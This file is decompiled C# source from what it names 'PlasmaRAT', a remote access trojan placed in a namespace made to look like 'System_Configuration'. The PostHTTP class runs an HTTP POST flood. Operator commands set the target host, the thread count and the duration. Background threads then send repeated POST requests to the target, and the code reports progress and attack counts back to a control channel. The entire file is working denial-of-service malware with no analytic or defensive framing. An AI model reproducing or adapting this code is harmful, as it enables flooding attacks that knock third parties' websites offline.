using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x02000009 RID: 9
	[StandardModule]
	public sealed class PostHTTP
	{
		// Token: 0x0600001E RID: 30 RVA: 0x000037A0 File Offset: 0x000019A0
		public static void StartPOSTHTTP(string Host, int Threadsto, int Time, string data)
		{
			if (!PostHTTP.AttackRunning)
			{
				PostHTTP.AttackRunning = true;
				PostHTTP.HostToAttack = Host;
				PostHTTP.PostDATA = data;
				PostHTTP.ThreadstoUse = Threadsto;
				PostHTTP.TimetoAttack = Time;
				PostHTTP.Threads = new Thread[Threadsto - 1 + 1];
				PlasmaRAT.TalktoChannel("HTTP POST Attack on " + PostHTTP.HostToAttack + " started!", "");
				int num = 0;
				int num2 = Threadsto - 1;
				for (int i = num; i <= num2; i++)
				{
					PostHTTP.Threads[i] = new Thread(new ThreadStart(PostHTTP.DoWork));
					PostHTTP.Threads[i].IsBackground = true;
					PostHTTP.Threads[i].Start();
				}
			}
			else
			{
				PlasmaRAT.TalktoChannel("A HTTP POST Attack is Already Running on " + PostHTTP.HostToAttack, "");
			}
		}

		// Token: 0x0600001F RID: 31 RVA: 0x0000386C File Offset: 0x00001A6C
		private static void lol()
		{
			PostHTTP.ThreadsEnded = Operators.AddObject(PostHTTP.ThreadsEnded, 1);
			if (Operators.ConditionalCompareObjectEqual(PostHTTP.ThreadsEnded, PostHTTP.ThreadstoUse, false))
			{
				PostHTTP.ThreadsEnded = 0;
				PostHTTP.ThreadstoUse = 0;
				PostHTTP.AttackRunning = false;
				PlasmaRAT.TalktoChannel("HTTP POST Attack on " + PostHTTP.HostToAttack + " finished successfully. Attacks Sent: " + PostHTTP.attacks.ToString(), "");
				PostHTTP.attacks = 0;
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x000038EC File Offset: 0x00001AEC
		public static void StopPOSTHTTP()
		{
			if (PostHTTP.AttackRunning)
			{
				int num = 0;
				int num2 = PostHTTP.ThreadstoUse - 1;
				for (int i = num; i <= num2; i++)
				{
					try
					{
						PostHTTP.Threads[i].Abort();
					}
					catch (Exception ex)
					{
					}
				}
				PostHTTP.AttackRunning = false;
				PlasmaRAT.TalktoChannel("HTTP POST Attack on " + PostHTTP.HostToAttack + " aborted successfully. Attacks Sent: " + PostHTTP.attacks.ToString(), "");
				PostHTTP.attacks = 0;
			}
			else
			{
				PlasmaRAT.TalktoChannel("No HTTP POST Attack is Running!", "");
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003988 File Offset: 0x00001B88
		private static void DoWork()
		{
			try
			{
				WebClient webClient = new WebClient();
				TimeSpan t = TimeSpan.FromSeconds((double)PostHTTP.TimetoAttack);
				Stopwatch stopwatch = Stopwatch.StartNew();
				while (stopwatch.Elapsed < t)
				{
					try
					{
						webClient.UploadString(PostHTTP.HostToAttack, PostHTTP.PostDATA);
						PostHTTP.attacks++;
						webClient.Dispose();
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
			PostHTTP.lol();
		}

		// Token: 0x04000024 RID: 36
		private static object ThreadsEnded = 0;

		// Token: 0x04000025 RID: 37
		private static string PostDATA;

		// Token: 0x04000026 RID: 38
		private static string HostToAttack;

		// Token: 0x04000027 RID: 39
		private static int TimetoAttack;

		// Token: 0x04000028 RID: 40
		private static int ThreadstoUse;

		// Token: 0x04000029 RID: 41
		private static Thread[] Threads;

		// Token: 0x0400002A RID: 42
		private static bool AttackRunning = false;

		// Token: 0x0400002B RID: 43
		private static int attacks = 0;
	}
}
